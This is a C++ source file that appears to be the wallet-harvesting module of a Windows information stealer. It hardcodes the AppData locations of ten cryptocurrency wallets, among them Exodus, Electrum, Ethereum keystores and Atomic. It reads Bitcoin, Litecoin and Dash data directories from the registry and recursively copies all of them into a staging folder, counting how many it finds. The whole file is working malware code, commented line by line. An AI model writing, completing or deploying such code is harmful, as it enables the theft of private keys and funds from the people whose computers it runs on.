#include "Wallets.h"
#include "Counter.h"
#include "Paths.h"
#include <windows.h>
#include <iostream>
#include <fstream>
#include <stdexcept>

#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include <experimental/filesystem>
namespace fs = std::experimental::filesystem;

// Define a static member variable 'walletsDirectories_' for the Wallets class, which holds
// the directories where different wallet files are located.
const std::vector<std::vector<std::string>> Wallets::walletsDirectories_ = {

    // Each wallet's name is paired with its directory path.
    { "Zcash", Paths::Appdata + "\\Zcash" },  // Zcash wallet location
    { "Armory", Paths::Appdata + "\\Armory" }, // Armory wallet location
    { "Bytecoin", Paths::Appdata + "\\bytecoin" }, // Bytecoin wallet location
    { "Jaxx", Paths::Appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb" }, // Jaxx wallet location
    { "Exodus", Paths::Appdata + "\\Exodus\\exodus.wallet" }, // Exodus wallet location
    { "Ethereum", Paths::Appdata + "\\Ethereum\\keystore" }, // Ethereum wallet location
    { "Electrum", Paths::Appdata + "\\Electrum\\wallets" }, // Electrum wallet location
    { "AtomicWallet", Paths::Appdata + "\\atomic\\Local Storage\\leveldb" }, // AtomicWallet location
    { "Guarda", Paths::Appdata + "\\Guarda\\Local Storage\\leveldb" }, // Guarda wallet location
    { "Coinomi", Paths::Appdata + "\\Coinomi\\Coinomi\\wallets" } // Coinomi wallet location
};

// Define a static member variable 'walletsRegistry_' for the Wallets class, which holds
// wallet names that are registered in the system (likely in the registry).
const std::vector<std::string> Wallets::walletsRegistry_ = {
    "Litecoin", // Litecoin wallet
    "Dash",     // Dash wallet
    "Bitcoin"   // Bitcoin wallet
};

// Method to gather wallets from the directories and registry and copy them to a given directory.
void Wallets::getWallets(const std::string& saveDir)
{
    try
    {
        // Iterate over each wallet directory from the 'walletsDirectories_' list
        for (const auto& wallet : walletsDirectories_)
        {
            // Call the method to copy wallet data from the directory to the save location
            copyWalletFromDirectoryTo(saveDir, wallet[1], wallet[0]);
        }

        // Iterate over each wallet name from the 'walletsRegistry_' list
        for (const auto& wallet : walletsRegistry_)
        {
            // Call the method to copy wallet data from the registry to the save location
            copyWalletFromRegistryTo(saveDir, wallet);
        }

         //If no wallets were copied (i.e., Counter::Wallets == 0), remove the save directory
        if (Counter::Wallets == 0)
        {
            fs::remove_all(saveDir); // Remove the directory if it's empty
        }
    }
    catch (const std::exception& ex)
    {
        // Catch any exception and print an error message if something goes wrong
        std::cerr << "Wallets >> Failed collect wallets\n" << ex.what() << std::endl;
    }
}

// Method to copy wallet data from a specified directory to the save location.
void Wallets::copyWalletFromDirectoryTo(const std::string& saveDir, const std::string& walletDir, const std::string& walletName)
{
    // Construct the target save directory path for the wallet
    std::string sdir = saveDir + "\\" + walletName;

    // If the source directory doesn't exist, return early
    if (!fs::exists(walletDir))
    {
        return;
    }
 
    // Recursively copy the wallet directory to the save location
    fs::copy(walletDir, sdir, fs::copy_options::recursive);

    // Increment the counter for wallets successfully copied
    Counter::Wallets++;
}

// Method to copy wallet data from the Windows registry to the save location.
void Wallets::copyWalletFromRegistryTo(const std::string& saveDir, const std::string& walletRegistry)
{
    // Construct the target save directory path for the wallet from the registry
    std::string sdir = saveDir + "\\" + walletRegistry;

    try
    {
        HKEY hKey; // Declare a registry key handle
        // Construct the registry key name based on the wallet's registry entry
        std::string keyName = "Software\\" + walletRegistry + "\\" + walletRegistry + "-Qt";

        // Try to open the registry key for reading
        if (RegOpenKeyEx(HKEY_CURRENT_USER, keyName.c_str(), 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
        {
            return; // Return early if the registry key does not exist or cannot be opened
        }

        DWORD dwType;
        DWORD dwSize = 1024; // Buffer size for reading the registry value
        char szData[1024]; // Buffer to hold the registry data (directory path)

        // Query the registry for the "strDataDir" value, which contains the wallet's directory path
        if (RegQueryValueEx(hKey, "strDataDir", nullptr, &dwType, (LPBYTE)szData, &dwSize) != ERROR_SUCCESS)
        {
            RegCloseKey(hKey); // Close the registry key if querying fails
            return;
        }

        // Construct the full directory path to the wallet's "wallets" folder
        std::string cdir = std::string(szData) + "\\wallets";

        // If the directory does not exist, return early
        if (!fs::exists(cdir))
        {
            RegCloseKey(hKey); // Close the registry key before returning
            return;
        }

        // Close the registry key after successfully getting the data directory
        RegCloseKey(hKey);

        // Recursively copy the wallet directory to the save location
        fs::copy(cdir, sdir, fs::copy_options::recursive);

        // Increment the counter for wallets successfully copied
        Counter::Wallets++;
    }
    catch (const std::exception& ex)
    {
        // Catch any exception and print an error message if something goes wrong
        std::cerr << "Wallets >> Failed to collect wallet from registry\n" << ex.what() << std::endl;
    }
}

